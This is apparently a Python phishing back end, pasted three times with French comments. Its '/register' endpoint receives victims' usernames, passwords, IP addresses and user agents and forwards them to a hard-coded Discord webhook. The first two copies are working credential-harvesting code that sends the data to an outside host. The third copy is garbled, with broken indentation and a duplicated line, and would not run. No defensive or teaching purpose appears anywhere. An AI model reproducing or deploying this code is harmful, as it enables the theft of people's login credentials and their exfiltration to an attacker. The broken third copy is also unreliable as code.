import os
import json
import datetime
import urllib.request
from http.server import HTTPServer, SimpleHTTPRequestHandler

WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHvEPoE4F_NQRmA-6v6-BC5HWbmBc2nmkK"

class MyHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/register':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            # Affichage dans la console
            print("[+] Nouvelles données reçues :", data)

            # Horodatage de la réception
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Envoi vers Discord
            msg = (
                f"--- NOUVELLE CONNEXION [{now}] ---\n"
                f"Utilisateur : {data.get('username')}\n"
                f"Mot de passe : {data.get('password')}\n"
                f"Adresse IP : {data.get('ip')}\n"
                f"Localisation IP : https://ip-api.com/#{data.get('ip')}\n"
                f"User-Agent : {data.get('userAgent')}\n"
                f"Photo : {data.get('photo_url')}"
            )

            payload = json.dumps({"content": msg}).encode('utf-8')
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=payload,
                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            )

            try:
                urllib.request.urlopen(req)
            except Exception as e:
                print("Erreur envoi Discord :", e)

            # Réponse JSON envoyée au navigateur
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        else:
            self.send_error(404, "Page non trouvée")

# Lancement du serveur (port dynamique pour Render)
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    server_address = ('', port)
    httpd = HTTPServer(server_address, MyHandler)
    print(f"Serveur lancé avec succès sur le port {port}...")
    httpd.serve_forever()
import os
import json
import datetime
import urllib.request
from http.server import HTTPServer, SimpleHTTPRequestHandler

WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"

class MyHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/register':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            # Affichage dans la console
            print("[+] Nouvelles données reçues :", data)

            # Horodatage de la réception
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Envoi vers Discord (indentation corrigée)
            msg = (
                f"--- NOUVELLE CONNEXION [{now}] ---\n"
                f"Utilisateur : {data.get('username')}\n"
                f"Mot de passe : {data.get('password')}\n"
                f"Adresse IP : {data.get('ip')}\n"
                f"Localisation IP : https://ip-api.com/#{data.get('ip')}\n"
                f"User-Agent : {data.get('userAgent')}\n"
                f"Photo : {data.get('photo_url')}"
            )

            payload = json.dumps({"content": msg}).encode('utf-8')
            req = urllib.request.Request(
                WEBHOOK_URL, 
                data=payload, 
                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            )
            
            try:
                urllib.request.urlopen(req)
            except Exception as e:
                print("Erreur envoi Discord :", e)

            # Réponse JSON envoyée au navigateur
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        else:
            self.send_error(404, "Page non trouvée")

# Lancement du serveur (port dynamique pour Render)
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    server_address = ('', port)
    httpd = HTTPServer(server_address, MyHandler)
    print(f"Serveur lancé avec succès sur le port {port}...")
    httpd.serve_forever()
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import datetime
import urllib.request

WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"

class MyHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/register':
            content_length = int(self.headers['Content-Length'])
post_data = self.rfile.read(content_length)
data = json.loads(post_data.decode('utf-8'))

# Affichage dans la console
print("[+] Nouvelles données reçues :", data)

# Horodatage de la réception
now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Envoi vers Discord
           msg = (
            msg = (
f"--- NOUVELLE CONNEXION [{now}] ---\n"
f"Utilisateur : {data.get('username')}\n"
f"Mot de passe : {data.get('password')}\n"
f"Adresse IP : {data.get('ip')}\n"
f"Localisation IP : https://ip-api.com/#{data.get('ip')}\n"
f"User-Agent : {data.get('userAgent')}"
)
payload = json.dumps({"content": msg}).encode('utf-8')
req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
try:
urllib.request.urlopen(req)
except Exception as e:
print("Erreur envoi Discord:", e)

# Réponse JSON envoyée au navigateur
self.send_response(200)
self.send_header('Content-Type', 'application/json')
self.end_headers()
self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
else:
self.send_error(404, "Page non trouvée")

# Lancement du serveur
server_address = ('', 8080)
httpd = HTTPServer(server_address, MyHandler)
print("Serveur lancé avec succès sur le port 8080...")
httpd.serve_forever()
